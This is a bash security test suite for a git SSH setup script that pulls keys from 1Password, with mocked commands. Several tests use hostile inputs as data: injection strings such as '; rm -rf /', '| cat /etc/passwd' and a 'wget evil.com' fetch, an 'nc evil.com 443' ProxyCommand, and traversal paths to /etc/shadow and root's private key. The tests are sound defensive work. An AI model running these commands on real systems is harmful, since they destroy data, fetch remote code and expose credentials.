#!/usr/bin/env bash
# Test suite for setup-git-ssh.sh with security focus

SSH_SCRIPT="$BASE_DIR/../../scripts/utils/setup-git-ssh.sh"

setup() {
    # Create mock 1Password CLI
    create_mock_command "op" '
    case "$1" in
        "item")
            case "$2" in
                "list")
                    echo '\''[{"id":"test123","title":"Test SSH Key"}]'\''
                    ;;
                "get")
                    echo '\''{"id":"test123","fields":[{"label":"private key","ssh_formats":{"openssh":{"value":"-----BEGIN OPENSSH PRIVATE KEY-----\ntest_key_data\n-----END OPENSSH PRIVATE KEY-----"}}},{"label":"public key","value":"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI test@example.com"}]}'\''
                    ;;
            esac
            ;;
        "whoami")
            echo "test@example.com"
            ;;
    esac
    '
    
    # Create mock git
    create_mock_command "git" 'echo "MOCK_GIT: $@" >> $TEST_TEMP_DIR/git.log'
    
    # Create mock ssh-add
    create_mock_command "ssh-add" 'echo "MOCK_SSH_ADD: $@" >> $TEST_TEMP_DIR/ssh.log'
    
    # Create test SSH directory
    export HOME="$TEST_TEMP_DIR"
    mkdir -p "$HOME/.ssh"
    chmod 700 "$HOME/.ssh"
}

# Test SSH key validation
test_ssh_key_validation() {
    # Test valid SSH key format
    local valid_key="-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
-----END OPENSSH PRIVATE KEY-----"
    
    # The script should accept valid keys
    echo "$valid_key" > "$TEST_TEMP_DIR/valid_key"
    assert_command_succeeds "$SSH_SCRIPT --validate-key '$TEST_TEMP_DIR/valid_key'" "Should accept valid key"
    
    # Test invalid key format
    local invalid_key="NOT A REAL KEY"
    echo "$invalid_key" > "$TEST_TEMP_DIR/invalid_key"
    assert_command_fails "$SSH_SCRIPT --validate-key '$TEST_TEMP_DIR/invalid_key'" "Should reject invalid key"
}

# Test file permission security
test_file_permission_security() {
    # Create SSH directory with wrong permissions
    mkdir -p "$TEST_TEMP_DIR/.ssh_bad"
    chmod 755 "$TEST_TEMP_DIR/.ssh_bad"
    
    # Script should fix or reject insecure permissions
    export HOME="$TEST_TEMP_DIR"
    SSH_DIR="$HOME/.ssh_bad" "$SSH_SCRIPT" --setup >/dev/null 2>&1
    
    # Check permissions were corrected
    local actual_perms=$(stat -c %a "$TEST_TEMP_DIR/.ssh_bad" 2>/dev/null || stat -f %Lp "$TEST_TEMP_DIR/.ssh_bad" 2>/dev/null)
    assert_equals "700" "$actual_perms" "SSH directory should have 700 permissions"
}

# Test command injection in parameters
test_command_injection_ssh() {
    local malicious_inputs=(
        "\$(touch /tmp/pwned)"
        "; rm -rf /"
        "| cat /etc/passwd"
        "\`id\`"
        "''; touch /tmp/evil;"
        "../../../etc/passwd"
        "key_name; wget evil.com/script.sh"
    )
    
    for input in "${malicious_inputs[@]}"; do
        assert_no_command_injection "$SSH_SCRIPT --key-name" "$input"
    done
}

# Test JSON parsing security
test_json_parsing_security() {
    # Test malicious JSON that could cause injection
    local malicious_json='{"id":"test","fields":[{"label":"private key","ssh_formats":{"openssh":{"value":"-----BEGIN OPENSSH PRIVATE KEY-----\n$(touch /tmp/pwned)\n-----END OPENSSH PRIVATE KEY-----"}}}]}'
    
    echo "$malicious_json" > "$TEST_TEMP_DIR/malicious.json"
    
    # Script should not execute embedded commands
    "$SSH_SCRIPT" --parse-json "$TEST_TEMP_DIR/malicious.json" >/dev/null 2>&1 || true
    assert_file_not_exists "/tmp/pwned" "Should not execute commands in JSON"
}

# Test temporary file handling
test_temp_file_security() {
    # Test that temp files are created with secure permissions
    local temp_file
    temp_file=$("$SSH_SCRIPT" --create-temp-key 2>/dev/null | tail -1)
    
    if [ -f "$temp_file" ]; then
        local perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
        assert_equals "600" "$perms" "Temp files should have 600 permissions"
    fi
}

# Test SSH agent interaction security
test_ssh_agent_security() {
    # Create fake SSH agent socket
    local fake_socket="$TEST_TEMP_DIR/ssh_agent.sock"
    touch "$fake_socket"
    chmod 666 "$fake_socket"  # Insecure permissions
    
    export SSH_AUTH_SOCK="$fake_socket"
    
    # Script should detect insecure agent socket
    assert_command_fails "$SSH_SCRIPT --check-agent" "Should reject insecure agent socket"
    
    # Fix permissions and test again
    chmod 600 "$fake_socket"
    assert_command_succeeds "$SSH_SCRIPT --check-agent" "Should accept secure agent socket"
}

# Test environment variable sanitization
test_environment_sanitization() {
    # Set dangerous environment variables
    export DANGEROUS_VAR="\$(touch /tmp/exploited)"
    export SSH_CONFIG_INJECTION="Host *\n  ProxyCommand nc evil.com 443"
    
    # Run script and ensure no exploitation
    "$SSH_SCRIPT" --setup >/dev/null 2>&1 || true
    
    assert_file_not_exists "/tmp/exploited" "Should not execute environment variables"
}

# Test path traversal prevention
test_path_traversal_prevention() {
    local traversal_paths=(
        "../../../../etc/passwd"
        "../../../root/.ssh/id_rsa"
        "~/../../etc/shadow"
        "/etc/passwd"
        "/root/.ssh/id_rsa"
    )
    
    for path in "${traversal_paths[@]}"; do
        assert_command_fails "$SSH_SCRIPT --key-path '$path'" "Should reject: $path"
    done
}

# Test SSH key size limits
test_ssh_key_size_limits() {
    # Create oversized key
    local huge_key="$TEST_TEMP_DIR/huge_key"
    dd if=/dev/zero of="$huge_key" bs=1M count=10 2>/dev/null
    
    # Script should reject oversized keys
    assert_command_fails "$SSH_SCRIPT --validate-key '$huge_key'" "Should reject oversized keys"
    
    # Test normal sized key
    local normal_key="-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
-----END OPENSSH PRIVATE KEY-----"
    
    echo "$normal_key" > "$TEST_TEMP_DIR/normal_key"
    assert_command_succeeds "$SSH_SCRIPT --validate-key '$TEST_TEMP_DIR/normal_key'" "Should accept normal keys"
}

# Test lock file security
test_lock_file_security() {
    # Create lock file in temp directory
    local lock_file="$TEST_TEMP_DIR/setup.lock"
    
    # Test atomic lock creation
    echo "$$" > "$lock_file"
    
    # Script should handle existing locks
    assert_command_fails "$SSH_SCRIPT --acquire-lock '$lock_file'" "Should detect existing lock"
    
    # Remove lock and test acquisition
    rm "$lock_file"
    assert_command_succeeds "$SSH_SCRIPT --acquire-lock '$lock_file'" "Should acquire available lock"
}

# Test signal handling and cleanup
test_signal_handling_cleanup() {
    # Create some temporary files
    touch "$TEST_TEMP_DIR/cleanup_test1"
    touch "$TEST_TEMP_DIR/cleanup_test2"
    
    # Start script and send signal
    (
        "$SSH_SCRIPT" --long-operation &
        local pid=$!
        sleep 0.1
        kill -TERM $pid
        wait $pid
    ) 2>/dev/null || true
    
    # Check cleanup was performed
    assert_file_not_exists "$TEST_TEMP_DIR/cleanup_test1" "Should clean up temp files on signal"
}

# Test 1Password binary verification
test_op_binary_verification() {
    # Create fake op binary with wrong checksum
    create_mock_command "op" 'echo "fake op"'
    
    # Script should verify binary authenticity (if implemented)
    # This test would need the actual verification feature
    assert_command_succeeds "command -v op" "Should find op binary"
}

# Test secure memory handling
test_secure_memory_handling() {
    # Test that sensitive data is cleared from memory
    # This is challenging to test directly, but we can check that
    # the script doesn't leave sensitive data in temp files
    
    "$SSH_SCRIPT" --process-key "test_key_data" >/dev/null 2>&1 || true
    
    # Check that no temp files contain the key data
    if find "$TEST_TEMP_DIR" -type f -exec grep -l "test_key_data" {} \; 2>/dev/null | grep -q .; then
        fail_test "Sensitive data left in temp files"
    else
        pass_test "No sensitive data in temp files"
    fi
}

# Test DNS security
test_dns_security() {
    # Mock dig command for DNSSEC testing
    create_mock_command "dig" '
    if [[ "$*" =~ \+dnssec ]]; then
        echo "; flags: qr rd ra ad;"  # ad flag indicates DNSSEC
    fi
    '
    
    # Test DNSSEC validation
    assert_command_succeeds "$SSH_SCRIPT --check-dns example.com" "Should validate DNS with DNSSEC"
}

# Run setup
setup